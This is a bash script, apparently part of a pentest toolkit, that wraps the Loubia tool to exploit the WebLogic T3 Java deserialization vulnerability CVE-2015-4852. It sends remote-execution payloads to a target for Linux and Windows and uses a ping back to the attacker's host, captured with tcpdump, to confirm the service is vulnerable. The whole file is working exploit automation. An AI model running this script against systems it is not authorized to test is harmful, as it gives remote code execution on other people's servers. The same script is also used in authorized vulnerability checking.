#!/usr/bin/env bash

print_title() {
        BOLD=$(tput bold ; tput setaf 4)
        NORMAL=$(tput sgr0)
        echo "${BOLD} $1 ${NORMAL}"
}

print_info() {
        BOLD=$(tput bold)
        BLUE=$(tput setaf 4)
        NORMAL=$(tput sgr0)
        echo "${BOLD}${BLUE}[~] ${NORMAL}${BLUE}$1 ${NORMAL}"
}


IP=$1
PORT=$2
LOCALIP=$3
EXTRAOPT=$4

echo
echo
print_title "================================================================="
print_title "     Java deserialization in Weblogic T3(s) (CVE-2015-4852)      " 
print_title "             Exploitation attempt with Loubia                    "
print_title "================================================================="
echo

print_info "WARNING: This attack box must be reachable from the target !"
echo
print_info "Will try to ping local IP = ${LOCALIP} from target"

print_info "Running tcpdump in background to try to capture ICMP requests if service is vuln..."
sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"

print_info "Running Loubia command for target Linux:"
print_info "python2.7 loubia.py ${IP} ${PORT} ${EXTRAOPT} -o lin -c '/bin/ping -c 4 ${LOCALIP}' -v"
python2.7 loubia.py ${IP} ${PORT} ${EXTRAOPT} -o lin -c '/bin/ping -c 4 ${LOCALIP}' -v

print_info "Wait a little bit..."
sleep 3
PID=$(ps -e | pgrep tcpdump)
print_info "Kill tcpdump (PID=${PID})"
sudo kill -9 $PID 
sleep 2

print_info "Captured ICMP traffic:"
echo
sudo tcpdump -r /tmp/dump.pcap
echo
print_info "Delete capture"
sudo rm /tmp/dump.pcap


print_info "Restart tcpdump"
sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"

print_info "Running Loubia command for target Windows:"
print_info "python2.7 loubia.py ${IP} ${PORT} ${EXTRAOPT} -o win -c 'ping ${LOCALIP}' -v"
python2.7 loubia.py ${IP} ${PORT} ${EXTRAOPT} -o win -c 'ping ${LOCALIP}' -v

print_info "Wait a little bit..."
sleep 3
PID=$(ps -e | pgrep tcpdump)
print_info "Kill tcpdump (PID=${PID})"
sudo kill -9 $PID 
sleep 2

print_info "Captured ICMP traffic:"
echo
sudo tcpdump -r /tmp/dump.pcap
echo
print_info "Delete capture"
sudo rm /tmp/dump.pcap

